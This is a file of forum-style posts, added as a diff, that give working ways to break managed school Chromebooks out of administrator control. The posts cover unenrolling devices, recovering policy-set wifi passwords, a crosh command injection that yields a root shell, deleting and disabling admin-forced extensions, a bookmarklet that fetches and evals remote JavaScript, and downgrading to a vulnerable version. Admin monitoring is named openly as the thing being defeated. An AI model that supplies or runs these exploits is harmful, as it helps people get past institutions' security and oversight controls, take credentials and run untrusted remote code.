@@ -1,0 +1,177 @@
+Unenroll chromebook from management (remove all admin stuff, set your own wallpaper, add your own account ect)
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+With this post, you can unenroll and re enroll the chromebook as you like. For this reason, this exploit is completely OP. It also lets you go on dev mode, which allows for limitless posibilities, such as downloading windows on a chromebook.
+
+All you have to do is follow the instructions on https://shimmer.me
+
+A usb will be required and you will also need to find the wifi password before you do this.
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Find wifi passwords of policy set wifi
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+This post tells you how to find the wifi password of policy set networks (e.g. school wifi)
+
+Step 1:
+go to https://luphoria.com/netlog-policy-password-tool
+
+Step 2: 
+Follow the instructions on the page.
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+disable force-added extensions on chrome os (UPDATED)
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+being on v107 dosen't allow you to use ltbeef to remove extensions? look no further!
+
+step 1:
+copy this url and enter it in your browser:
+
+chrome-extension://gndmhdcefbhlchkhipcnnbkcmicncehk/manifest.json
+
+step 2:
+
+open inspect element, go to console in the top right and type in this line of code:
+
+chrome.management.setEnabled('EXTENSION ID HERE', false)
+
+where it says EXTENSION ID HERE, type in the extension id found on chrome://extensions that you want to remove.
+
+Quick method:
+
+
+Follow step 1 and in the console paste in the code found below
+
+chrome.management.setEnabled('jcdhmojfecjfmbdpchihbeilohgnbdci', false);chrome.management.setEnabled('jnhblfnklpfpbbadlfbikhhifadinfho', false);chrome.management.setEnabled('cpnjigmgeapagmdimmoenaghmhilodfg',false);
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Permanantly remove extensions (root required)
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Press ctrl + alt + t then enter:
+
+Step 1: set_cellular_ppp \';bash;exit;\'
+
+Step 2: rm -rf ~/Extensions/*
+
+Step 3: chmod 000 ~/Extensions
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Root escalation in crosh
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+With this post you can escalate crosh into root privileges!
+
+Crosh in root can be very dangerous if you don't know what you are doing, as you can break the internal policy and brick your chromebook forever.
+
+For this exploit, you must be in a version under 90, ideally 81.
+
+Step 1: Press CTRL + Alt + T
+
+Step 2: Type in set_cellular_ppp \';bash;exit;\' 
+
+Step 3: You are now in root
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+disable force-added extensions on chrome os
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+want to get rid of that annoying web filter stopping you from accessing anything other than whats set to you? 
+
+look no further, in this post you will find how to disable it and stop it from ever bothering you again.
+
+requirements:
+
+-chome os v105 (or lower) | recommended version: 81
+-bookmarklet capability
+
+step 1:
+copy this:
+
+javascript:fetch("https://compactcow.com/ltbeef/exploit.js").then(data=>{data.text().then(text=>{eval(text)})});
+
+step 2:
+look at the bar at the top of the page where the url is, then look to your right and click the star.
+
+step 3:
+click on the "More..." button
+
+step 4:
+select the url box, press ctrl + a then backspace, then paste in the code you copied from earlier.
+
+well done! you have successfully installed the exploit on your device! now head over to any webpage, click on the bookmark you just created and disable whatever extension you need. whats great about this is that you can also disable web applications, which makes it impossible for admins to monitor what you type or see!
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+downgrade any chrome os device
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+want to downgrade your chrome os device so you can look for exploits / dependencies? in this post you will learn how to downgrade your chrome os device without developer mode.
+
+Requirements:
+-8GB USB stick / external hard drive
+-A personal computer that can run extensions from the chrome web store
+-a brain ( preferred)
+
+Step 1:
+Go onto google chrome on the chrome os device and type in "chrome://version".
+
+Step 2:
+Look at the line called platform and get the build id (next to the (Official Build)).
+
+The most common id is "octopus".
+
+Step 3:
+Go onto chrome100.dev on your personal computer, press ctrl + f and type in the last word of your build id e.g "octopus".
+
+Step 4:
+Download the preferred version. I reccomend 81 as it has most the exploits on this forum.
+
+Step 5: 
+Download "Chromebook Recovery Utility" on your personal computer through the chrome web store.
+
+Step 6:
+Open CRU, press the gear icon on the top right and select use local image. Proceed to select the file you just downloaded.
+
+Step 7:
+Plug in the USB Flash Stick / External HDD.
+
+Step 8:
+Follow the prompts till it is complete.
+
+Step 9:
+On your chrome os device, sign out and press esc + refresh + power to bring up the recovery screen. Proceed to plug in your USB / External HDD.
+
+Step 10:
+Once it is complete, setup like usual but once you have accepted the user agreement and see "checking for updates", keep pressing ctrl + alt + e to avoid chrome automatically updating.
+
+congratulations! you have now downgraded your device and can go ahead and complete any of the other posts on the forum. i posted this tutorial as there wasn't already one and it might of been confusing for beginners.
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+bypass playstore lock / disabled
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Q: I'm sick and tired of the playstore being blocked, it has access to so many vital features. How do I unblock it?
+
+A: This method only works if your chromebook is v81, however you can update it later and still keep the apps.
+
+Variables: aga - Addition of google accounts disabled by administrator
+
+if aga is false:
+
+Downgrade to chrome os v81
+
+Complete setup like usual
+
+Wait till play store installs
+
+Go to settings > apps > Google Play Store > Manage Android Preferences > Accounts > Add Account > Google
+
+Sign into an alternate account or your main one, just make sure it isn't one that is under your chrome os administrator's domain
+
+Go to google play store, press on the profile icon at the top left, select your account and done!
+
+if aga is true:
+
+Downgrade to chrome os v81
+
+Complete setup like usual
+
+Wait till play store installs
+
+Quickly go to settings > apps > Google Play Store > Manage Android Preferences > Accounts > Add Account > Google
+
+Sign into an alternate account or your main one, just make sure it isn't one that is under your chrome os administrator's domain
+
+Go to google play store, press on the profile icon at the top left, select your account and done!
+
+If google play store keeps closing while trying to install, press "download" on your app, then quickly switch to your default account.
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+flood history bookmarklet
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+javascript:var num=prompt("How Times Do You Want This Page To Show Up In your History?");done=false;x=window.location.href;for (var i=1; i<=num; i++){history.pushState(0, 0, i==num?x:i.toString());if(i==num){done=true}}if(done===true){alert("History Flooding Successful!\n "+window.location.href+" \nNow Appears In Your History "+num+(num==1?" time.":" Times. \nMade By: user"))}
